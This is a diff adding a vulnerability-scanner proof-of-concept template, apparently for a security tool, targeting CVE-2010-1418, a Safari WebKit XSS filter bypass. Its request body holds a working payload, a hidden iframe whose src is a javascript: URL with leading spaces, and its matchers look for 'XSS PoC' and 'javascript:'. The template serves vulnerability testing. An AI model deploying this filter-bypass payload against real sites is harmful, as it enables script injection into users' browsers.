@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "通过在 FRAME 元素的 SRC 属性中使用前导空格加 javascript: 协议序列，绕过 Safari WebKit 的 XSS 过滤机制，注入任意 JavaScript 代码"
+id = "POC-AVE-2010-0161"
+name = "CVE-2010-1418 WebKit Safari FRAME javascript: XSS PoC"
+severity = "medium"
+tags = ["ave-2010-0161"]
+vuln_id = [
+    "CVE-2010-1418",
+    "AVE-2010-0161",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = """<html><head><title>XSS PoC CVE-2010-1418</title></head><body><h1>WebKit FRAME javascript: XSS PoC</h1><p>Vulnerable FRAME:</p><iframe src="   javascript:parent.document.title='XSS-Triggered'" style="display:none"></iframe></body></html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "XSS PoC",
+    "javascript:",
+]
